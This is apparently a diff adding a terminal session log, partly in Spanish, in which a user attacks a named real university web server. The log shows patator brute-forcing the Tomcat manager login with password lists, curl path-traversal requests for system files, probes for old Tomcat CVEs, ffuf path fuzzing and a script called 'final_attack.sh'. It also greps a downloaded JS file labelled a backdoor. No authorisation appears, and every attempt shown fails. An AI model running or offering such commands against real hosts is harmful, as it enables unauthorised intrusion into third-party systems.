@@ -1,0 +1,182 @@
+banner2.jpg                      100%[=======================================================>]  10.84K  --.-KB/s    en 0s      
+
+2025-10-08 19:13:21 (101 MB/s) - «banner2.jpg» guardado [11101/11101]
+
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             JPEG image data, JFIF standard 1.01
+30            0x1E            TIFF image data, big-endian, offset of first image directory: 8
+
+
+025-10-08 19:13:24 (1.18 MB/s) - «banner2.png» guardado [344245/344245]
+
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PNG image, 2903 x 796, 8-bit/color RGBA, non-interlaced
+62            0x3E            Zlib compressed data, default compression
+
+
+025-10-08 19:13:26 (774 KB/s) - «profile.png» guardado [102632/102632]
+
+Software                        : Macromedia Fireworks 8
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PNG image, 489 x 289, 8-bit/color RGBA, non-interlaced
+121           0x79            Zlib compressed data, default compression
+1520          0x5F0           Zlib compressed data, default compression
+11409         0x2C91          Zlib compressed data, default compression
+11685         0x2DA5          Zlib compressed data, default compression
+12561         0x3111          Zlib compressed data, default compression
+12907         0x326B          Zlib compressed data, default compression
+13246         0x33BE          Zlib compressed data, default compression
+15393         0x3C21          Zlib compressed data, default compression
+
+
+2025-10-08 19:13:28 (540 KB/s) - «logo.jpg» guardado [66442/66442]
+
+Software                        : Adobe ImageReady
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PNG image, 621 x 586, 8-bit/color RGBA, non-interlaced
+115           0x73            Zlib compressed data, best compression
+
+
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/wgets]
+└──╼ $strings backdoor_analysis.js | grep -E "^[a-zA-Z0-9]{10,}$" | head -20
+opqrstuvwxyzABCDEFGHIJKLMN
+opqrstuvwxyz
+OPQRSTUVWXYZ
+opqrstuvwxyz
+OPQRSTUVWXYZ
+opqrstuvwxyz
+OPQRSTUVWXYZ
+opqrstuvwxyz
+OPQRSTUVWXYZ
+opqrstuvwxyz
+OPQRSTUVWXYZ
+opqrstuvwxyzABCDEFGHIJKLMN
+opqrstuvwxyz
+OPQRSTUVWXYZ
+opqrstuvwxyz
+OPQRSTUVWXYZ
+opqrstuvwxyz
+OPQRSTUVWXYZ
+opqrstuvwxyzABCDEFGHIJKLMN
+opqrstuvwxyzABCDEFGHIJKLMN
+
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/wgets]
+└──╼ $grep -n "eval\|Function\|constructor\|setTimeout\|setInterval" backdoor_analysis.js
+┌─[✗]─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/wgets]
+└──╼ $grep -E "[A-Za-z0-9+/]{40,}={0,2}" backdoor_analysis.js
+		var data = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/- ";
+		var data = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789@-.";
+		var data = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-~$+=,&.1234567890/:_";
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/wgets]
+└──╼ $grep -E "(\\x[0-9a-f]{2}){10,}" backdoor_analysis.js
+
+
+┌─[✗]─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/wgets]
+└──╼ $grep -oE "['\"](/[a-zA-Z0-9_./-]+)['\"]" backdoor_analysis.js | sort -u
+
+
+─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/directorios]
+└──╼ $patator http_fuzz url=https://sito.utslp.edu.mx/manager/html auth_type=basic user_pass=FILE0:FILE1 0=backdoor_users.txt 1=backdoor_pass.txt -t 2 -x ignore:code=401
+/usr/bin/patator:2601: DeprecationWarning: 'telnetlib' is deprecated and slated for removal in Python 3.13
+  from telnetlib import Telnet
+19:33:39 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.11.2 at 2025-10-08 19:33 CST
+19:33:39 patator    INFO -                                                                              
+19:33:39 patator    INFO - code size:clen       time | candidate                          |   num | mesg
+19:33:39 patator    INFO - -----------------------------------------------------------------------------
+19:33:42 patator    INFO - Hits/Done/Skip/Fail/Size: 0/64/0/0/64, Avg: 21 r/s, Time: 0h 0m 3s
+
+
+curl -k "https://sito.utslp.edu.mx/../../../../../../../../windows/system32/drivers/etc/hosts"
+
+# Probar CVE-2011-3190 - Information Disclosure
+curl -k "https://sito.utslp.edu.mx/examples/jsp/error/error.jsp?obj=java.lang.System"
+
+# Probar CVE-2007-2449 - JMX Access
+curl -k "https://sito.utslp.edu.mx/jmx-console/"
+
+        ERROR 404
+
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/wgets]
+└──╼ $node decode.js
+=== BUSCANDO PATRONES CODIFICADOS ===
+
+
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/directorios]
+└──╼ $patator http_fuzz url=https://sito.utslp.edu.mx/manager/html auth_type=basic user_pass=FILE0:FILE1 0=backdoor_users.txt 1=temporal_passwords.txt -x ignore:code=401
+/usr/bin/patator:2601: DeprecationWarning: 'telnetlib' is deprecated and slated for removal in Python 3.13
+  from telnetlib import Telnet
+19:38:06 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.11.2 at 2025-10-08 19:38 CST
+19:38:06 patator    INFO -                                                                              
+19:38:06 patator    INFO - code size:clen       time | candidate                          |   num | mesg
+19:38:06 patator    INFO - -----------------------------------------------------------------------------
+19:38:12 patator    INFO - Hits/Done/Skip/Fail/Size: 0/240/0/0/240, Avg: 43 r/s, Time: 0h 0m 5s
+
+
+ :: URL              : https://sito.utslp.edu.mx/FUZZ
+ :: Wordlist         : FUZZ: /home/marcos_os/Desktop/ProyectoSito/NuevoComienzo/directorios/windows_paths.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200
+________________________________________________
+
+:: Progress: [7/7] :: Job [1/1] :: 55 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
+
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/wgets]
+└──╼ $echo "// Backdoor Analysis Environment" > test_backdoor.html
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/wgets]
+└──╼ $cat backdoor_analysis.js >> test_backdoor.html
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/wgets]
+└──╼ $echo "<script>console.log('Testing backdoor functions...');</script>" >> test_backdoor.html
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/wgets]
+└──╼ $grep -n "addEventListener\|onkey\|keycode\|charcode\|which" backdoor_analysis.js
+4:		var key = nav4 ? letra.which : letra.keyCode;
+15:		var key = nav4 ? letra.which : letra.keyCode;
+26:		var key = nav4 ? letra.which : letra.keyCode;
+37:		var key = nav4 ? letra.which : letra.keyCode;
+49:		  var key = nav4 ? letra.which : letra.keyCode;
+61:		var key = nav4 ? letra.which : letra.keyCode;
+72:		var key = nav4 ? letra.which : letra.keyCode;
+83:		var key = nav4 ? letra.which : letra.keyCode;
+94:		var key = nav4 ? letra.which : letra.keyCode;
+105:		var key = nav4 ? letra.which : letra.keyCode;
+116:		var key = nav4 ? letra.which : letra.keyCode;
+127:		var key = nav4 ? letra.which : letra.keyCode;
+138:		var key = nav4 ? letra.which : letra.keyCode;
+149:		var key = nav4 ? numero.which : numero.keyCode;
+160:		var key = nav4 ? numero.which : numero.keyCode;
+171:		var key = nav4 ? letra.which : letra.keyCode;
+182:		var key = nav4 ? letra.which : letra.keyCode;
+193:		var key = nav4 ? numero.which : numero.keyCode;
+204:		var key = nav4 ? numero.which : numero.keyCode;
+215:		var key = nav4 ? letra.which : letra.keyCode;
+226:		var key = nav4 ? letra.which : letra.keyCode;
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/wgets]
+└──╼ $grep -n "XMLHttpRequest\|fetch\|ajax\|post\\|get" backdoor_analysis.js
+
+
+┌─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo/Scrpits]
+└──╼ $./final_attack.sh 
+[+] FINAL ATTACK - Tomcat 6.0 + Backdoor Analysis
+[+] Deep backdoor analysis...
+[+] Intensive brute force...
+/usr/bin/patator:2601: DeprecationWarning: 'telnetlib' is deprecated and slated for removal in Python 3.13
+  from telnetlib import Telnet
+19:46:08 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.11.2 at 2025-10-08 19:46 CST
+19:46:08 patator    INFO -                                                                              
+19:46:08 patator    INFO - code size:clen       time | candidate                          |   num | mesg
+19:46:08 patator    INFO - -----------------------------------------------------------------------------
+19:46:09 patator    INFO - Hits/Done/Skip/Fail/Size: 0/0/0/0/0, Avg: 0 r/s, Time: 0h 0m 0s
+[+] Testing Windows XP paths...
+
+
+
